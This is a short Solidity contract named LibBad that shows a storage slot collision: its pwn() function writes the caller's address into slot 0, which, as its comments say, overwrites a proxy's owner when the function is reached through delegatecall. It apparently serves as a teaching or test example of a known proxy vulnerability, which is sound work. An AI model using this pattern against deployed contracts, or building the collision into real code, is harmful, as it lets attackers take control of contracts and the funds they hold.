// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract LibBad {
    // storage slot collision with Proxy
    address public owner; // slot 0
    function pwn() external { owner = msg.sender; } // clobbers proxy storage via delegatecall
}
